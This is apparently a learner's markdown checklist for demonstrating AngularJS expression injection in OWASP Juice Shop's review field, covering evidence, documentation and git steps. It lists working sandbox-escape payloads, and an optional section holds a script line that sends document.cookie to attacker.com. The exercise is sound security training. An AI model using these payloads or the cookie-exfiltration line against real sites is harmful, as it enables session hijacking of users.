# ✅ To-Do: AngularJS Expression Injection via Product Review Field (Method-3)

A structured task list to fully demonstrate, document, and version-control the exploitation of AngularJS template injection through unsanitized user-controlled inputs in OWASP Juice Shop.

---

## 🔍 Exploitation & Testing

- [x] Identify injection surface — locate the product review/comment field vulnerable to AngularJS binding.
- [x] Verify AngularJS context by injecting benign expression `{{1+1}}` and confirming output (`2`) in rendered HTML.
- [x] Inject test payload: `{{constructor.constructor('alert(1337)')()}}` into the review form.
- [x] Validate DOM execution via:
  - JavaScript alert popup
  - DOM inspection (DevTools → Elements)
  - Presence of `constructor.constructor` in rendered HTML

- [x] Attempt alternate sandbox escapes (if Juice Shop uses legacy AngularJS):
  - `{{[].pop.constructor('alert(1)')()}}`
  - `{{[].filter.constructor('confirm(1337)')()}}`

- [x] Confirm Juice Shop Score Board displays: ✅ "Bonus Payload Challenge" completed.

---

## 📸 Evidence Collection

- [x] Take a full-screen screenshot while:
  - Alert popup is visible
  - Scoreboard shows challenge completion
  - Injected payload is highlighted in `Elements` tab (optional)
- [x] Save screenshot as:  
  `AngularJS-Expression-Injection.png`

---

## 🛠️ Payload Archive

- [x] Create `payload.txt` with:
  - All raw payloads used
  - Encoded variants
  - Notes on which payloads triggered execution

---

## 📚 Documentation

- [x] Write a comprehensive `README.md` for:
  - Attack vector and flow
  - AngularJS internals and `constructor.constructor()` logic
  - Payload anatomy and execution model
  - Browser-side behavior and sink analysis
  - Security risk and CVSS estimation
  - Real-world implications (XSS, cookie theft, session hijack)
  - Remediation strategies for devs (e.g., `ng-bind`, DOM sanitization, CSP)

---

## 📁 Repository Hygiene

- [x] Create dedicated folder:
OWASP-Juice-Shop-Bonus-Payload/
└── Method-3-AngularJS-Expression-Injection/

markdown
Copy
Edit
- [x] Move into this folder:
- `README.md`
- `To-Do-Angular-Expression-Injection.md`
- `payload.txt`
- `AngularJS-Expression-Injection.png`

- [ ] Ensure all filenames follow kebab-case convention
- [ ] Check for duplicates across Method-2/Method-3 folders and remove obsolete ones

---

## 🔁 Git Operations

- [ ] Stage changes:
```bash
git add .
 Commit with meaningful message:

bash
Copy
Edit
git commit -m "🧠 Method-3: AngularJS Template Injection – payloads, doc, PoC added"
 Push changes to GitHub:

bash
Copy
Edit
git push origin main
🧪 Optional Enhancements
 Simulate session hijack via:

html
Copy
Edit
<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>
 Add CSP bypass or AngularJS sandbox escape research links

 Embed links to OWASP Top 10 A7 (XSS), AngularJS template injection references

"Client-side injection is not about just breaking the DOM — it's about owning the logic that binds it."
